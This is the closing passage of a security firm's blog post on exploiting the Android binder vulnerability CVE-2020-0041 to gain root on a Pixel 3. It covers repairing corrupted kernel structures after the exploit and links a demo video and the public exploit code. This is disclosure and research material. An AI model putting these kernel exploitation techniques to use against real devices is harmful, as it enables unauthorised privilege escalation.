      <span class="hljs-built_in">printf</span>(<span class="hljs-string">"[!!] Something went wrong, we're not root!!\n"</span>);
      <span class="hljs-keyword">goto</span> out;
   }
</pre>
<p>However this is not enough to enjoy a root shell yet, since we have corrupted quite some memory in kernel land and things will break as soon as we exit the current process and execute the shell. There are a few things that we need to repair:</p>
<ul>
<li>The <em>binder_node</em> structures we used to perform write primitives were reallocated through sendmsg, but have been freed again when performing the write. We need to make sure the corresponding threads do not free these objects again upon returning from sendmsg. For that, we parse the thread stacks and replace any references we find to these nodes by <a href="https://android.googlesource.com/kernel/msm/+/refs/tags/android-10.0.0_r0.42/include/linux/slab.h#109">ZERO_SIZE_PTR</a>.</li>
</ul>
<ul>
<li>We have modified the <em>f_inode</em> of a <em>struct file</em>, which now points into the middle of an <em>epitem</em>. The easiest way around this is to simply bump the reference count for this file such that release is never called on it.<br><br></li>
<li>While setting up the read primitive, we also corrupted a field in the <em>epitem</em> itself. This field was a linked list with one <em>epitem</em> only, so we can just copy the <em>fllist.prev</em> field on top of <em>fllist.next</em> to restore the list.<br><br></li>
<li>We also added a fake entry to <em>/proc/sys</em>, which we could leave around ... but in that case it'd be pointing to pages that belonged to our exploit and are now recycled by the kernel. We decided to just remove it from the rb-tree. Note that this makes the entry disappear from the userland view, but there is still a cached path in the kernel. Since we used a randomized name, chances are small that anybody would try to access it in the future by directly opening it.</li>
</ul>
<p>After cleaning all this mess up, we can finally execute our root shell and enjoy uid 0 without a crashing phone.</p>
<h2>Demonstration video</h2>
<p>The following video shows the process of rooting the phone from an adb shell using the exploit we just described:</p>
<p><video width="100%" height="240" class="u-max-full-width" controls="controls"><source src="https://static.bluefrostsecurity.de/img/labs/blog/num_valid_root.mp4" type="video/mp4"><object width="100%" height="240" data="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/moxieplayer.swf.下載" type="application/x-shockwave-flash"><param name="src" value="assets/components/tinymce/jscripts/tiny_mce/plugins/media/moxieplayer.swf"><param name="flashvars" value="url=https%3A//static.bluefrostsecurity.de/img/labs/blog/num_valid_root.mp4&amp;poster=/"><param name="allowfullscreen" value="true"><param name="allowscriptaccess" value="true"></object> Your browser does not support the video tag. </video></p>
<h2>Code</h2>
<p>You can find the code for the exploits described in this and the <a href="https://labs.bluefrostsecurity.de/blog/2020/03/31/cve-2020-0041-part-1-sandbox-escape/">previous post</a> at the <a href="https://github.com/bluefrostsecurity/CVE-2020-0041/">Blue Frost Security GitHub</a>. The exploit has only been tested on a Pixel 3 phone using the firmware from February 2020, and would need to be adapted for other firmwares. In particular there are a number of kernel offsets used in the exploit, as well as structure offsets that may vary between kernel versions.</p>
							</div>

                        </div>
                    </div>
                </div>
            </article>
        </main>

        <footer>
            <div class="bottom_bar">
                <div class="container">
                    <div class="row flip-sm">
                        <div class="three columns">
                            <p class="title">Company</p>
                            <p>Blue Frost Security GmbH</p>
                            <p>Friedrich-Ebert-Anlage 35-37</p>
                            <p>D-60327 Frankfurt am Main</p>
                            <p class="title">Contact</p>
                            <p>Tel.: +49 (0) 69 17320225-0</p>
                            <p>Fax: +49 (0) 69 17320225-9</p>
							<p> office(at)bluefrostsecurity(dot)de </p>
                            <p>&nbsp;</p>
                            <p>CEO: Lukas Hermann</p>
                        </div>
                        <div class="three columns">
                            <p class="title">BFS Labs</p>
                            <ul>
                                <li><a href="https://labs.bluefrostsecurity.de/" title="">Advisories</a></li>
                                <li><a href="https://labs.bluefrostsecurity.de/" title="">Publications</a></li>
                                <li><a href="https://labs.bluefrostsecurity.de/" title="">Blog</a></li>
								<li><a href="https://labs.bluefrostsecurity.de/disclosure-policy.html" title="">Disclosure Policy</a></li>
								<li><a href="https://labs.bluefrostsecurity.de/working-for-blue-frost-security.html" title="">Working for Blue Frost Security</a></li>
                            </ul>
                        </div>
                        <div class="three columns">
                            <p class="title">Our Services</p>
                            <ul>
                                <li><a href="https://www.bluefrostsecurity.de/en/services/offensive-threat-intelligence.html" title="">Offensive Threat Intelligence</a></li>
								<li><a href="https://www.bluefrostsecurity.de/en/services/penetration-testing.html" title="">Penetration Testing</a> </li>
								<li><a href="https://www.bluefrostsecurity.de/en/services/red-teaming.html" title="">Red Teaming</a></li>
                                <li><a href="https://www.bluefrostsecurity.de/en/services/application-security.html" title="">Application Security</a></li>
								<li><a href="https://www.bluefrostsecurity.de/en/services/training-workshops.html" title="">Training</a></li>
                            </ul>
                        </div>
                        <div class="three columns">
                            <p class="title">Legal Notice</p>
                            <ul class="biglinks">
                                <li><a href="https://labs.bluefrostsecurity.de/imprint.html" title="">Imprint</a></li>
                                <li><a href="https://labs.bluefrostsecurity.de/privacy-policy.html" title="">Privacy Policy</a></li>
                                <li><a href="https://labs.bluefrostsecurity.de/terms-and-conditions.html" title="">Terms and Conditions</a></li>
								<li><a onclick="klaro.show();return false;"><img src="./2020 - Exploiting CVE-2020-0041 - Part 2 Escalating to root_files/fingerprint.svg" class="img-responsive" style="width: 24px;margin-bottom: -8px;position: relative;" title="Change consent"></a></li>
                            </ul>
                            <div class="follow">
                                <span>Follow us</span>
                                <a class="social in" href="https://www.linkedin.com/company/blue-frost-security-gmbh"></a>
                                <a class="social twitter" href="https://twitter.com/bluefrostsec"></a>
                                <a class="social google" href="https://plus.google.com/+BluefrostsecurityDe"></a>
                            </div>
                        </div>
                    </div>
                </div>
                <div class="top_charet_down"></div>
            </div>
            <div class="cr_bar">
                <div class="container">
                    © 2021 Blue Frost Security GmbH
                </div>
            </div>
        </footer>
		<script>
		  function toggleMode() {
			  var a = localStorage.getItem("lm") == 1 ? 0 : 1;
			  switchMode(a);
		  }
		  function retrieveMode() {
			  var a = localStorage.getItem("lm") ;
			  switchMode(a);
		  }
		  function switchMode(a) {
			  if(a==1) {
				  document.body.classList.add("lm");
				  localStorage.setItem("lm", "1");
			  } else {
				  document.body.classList.remove("lm");
				  localStorage.setItem("lm", "0");
			  }
		  }
		  retrieveMode();
		</script>

    </div>


<div id="consentfriend"><div lang="en" class="klaro consentfriend"><div></div></div></div></body></html>